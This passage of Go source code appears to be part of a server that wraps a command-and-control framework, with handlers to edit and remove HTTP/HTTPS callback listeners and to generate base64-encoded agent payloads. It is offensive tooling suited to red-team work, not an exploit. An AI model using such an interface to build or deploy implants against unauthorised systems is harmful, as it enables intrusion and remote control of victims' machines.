	params.Config["Protocol"] = normProtocol

	// FIX I2: Provide safe defaults for HTTP/HTTPS to prevent panics in dispatch.go
	if normProtocol == "Http" || normProtocol == "Https" {
		setDefault := func(key string, val string) {
			if _, ok := params.Config[key]; !ok {
				params.Config[key] = val
			}
		}
		setDefault("HostBind", "0.0.0.0")
		setDefault("Hosts", "127.0.0.1")
		setDefault("Headers", "")
		setDefault("Uris", "/")
		setDefault("HostRotation", "round-robin")
		setDefault("PortBind", "80")
		setDefault("PortConn", "80")
		setDefault("HostHeader", "")
		setDefault("UserAgent", "Mozilla/5.0")
	}

	if err := s.opClient.EditListener(params.Name, stringifyConfig(params.Config)); err != nil {
		return nil, fmt.Errorf("edit listener: %w", err)
	}

	return map[string]any{
		"name":   params.Name,
		"status": "edited",
	}, nil
}

func (s *Server) handleRemoveListener(ctx context.Context, args json.RawMessage) (any, error) {
	var params struct {
		Name string `json:"name"`
	}
	if err := json.Unmarshal(args, &params); err != nil {
		return nil, err
	}

	if err := s.opClient.RemoveListener(params.Name); err != nil {
		return nil, fmt.Errorf("remove listener: %w", err)
	}

	return map[string]any{
		"name":   params.Name,
		"status": "removed",
	}, nil
}

// Payload generation handler (Phase 5)

func (s *Server) handleGeneratePayload(ctx context.Context, args json.RawMessage) (any, error) {
	var params struct {
		AgentType string `json:"agent_type"`
		Listener  string `json:"listener"`
		Arch      string `json:"arch"`
		Format    string `json:"format"`
		Config    string `json:"config"`
	}
	if err := json.Unmarshal(args, &params); err != nil {
		return nil, err
	}

	payload, err := s.opClient.GeneratePayload(ctx, params.AgentType, params.Listener, params.Arch, params.Format, params.Config)
	if err != nil {
		return nil, fmt.Errorf("generate payload: %w", err)
	}

	// Encode payload as base64 for transport
	payloadB64 := base64.StdEncoding.EncodeToString(payload.Data)

	return map[string]any{
		"agent_type":   params.AgentType,
		"listener":     params.Listener,
		"arch":         params.Arch,
		"format":       params.Format,
		"file_name":    payload.FileName,
		"payload_b64":  payloadB64,
		"payload_size": len(payload.Data),
		"status":       "generated",
	}, nil
}
